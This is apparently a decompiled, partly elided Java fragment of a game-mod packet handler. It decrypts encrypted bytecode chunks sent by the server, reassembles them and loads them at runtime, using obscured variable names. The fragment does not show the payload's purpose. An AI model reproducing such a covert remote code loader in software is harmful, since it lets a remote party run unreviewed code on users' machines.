...
public class Handler implements IMessageHandler<SCPacketArgus, IMessage> {
  ...
  public IMessage onMessage(SCPacketArgus message, MessageContext ctx) {
    ...
    if (bArray.length < 16)
      return null; 
    byte[] shufl = ArgusPayloadKeys.decrypt(SCPacketArgus.access$000(message), SCPacketArgus.access$100(message), SCPacketArgus.access$200(message));
    if (shufl == null)
      return null; 
    SCPacketArgus.access$002(message, null);
    ...
    try {
      ...
      out.writeByte(my / 6);
      out.write(pex);
      out.writeLong(SCPacketArgus.access$100(message));
      out.writeLong(SCPacketArgus.access$200(message));
      ...
      shuf1 = null;
      byte[] shuf3 = ArgusPayloadKeys.encrypt(XORUtils.asBytes(SCPacketArgus.access$100(message), SCPacketArgus.access$200(message)), shuf2);
      shuf2 = null;
      ...
      try {
        ...
        if (chunkData.getChunkId() == 0 || SCPacketArgus.access$300() == null) {
          SCPacketArgus.access$302(chunkData.getData());
        } else {
          SCPacketArgus.access$302(BytecodeUtils.duplicate(SCPacketArgus.access$300(), chunkData.getData()));
          boolean load = true;
          if (chunkData.getChunkCount() - 1 == chunkData.getChunkId()) {
            if (SCPacketArgus.access$400() != null && SCPacketArgus.loader != null) {
              if (Arrays.equals(SCPacketArgus.access$400(), SCPacketArgus.access$300()))
                load = false; 
              if (load)
                BytecodeUtils.unloadBytecode(); 
            } 
            if (load) {
              SCPacketArgus.access$402(SCPacketArgus.access$300());
              try {
                BytecodeUtils.loadBytecode(SCPacketArgus.access$400());
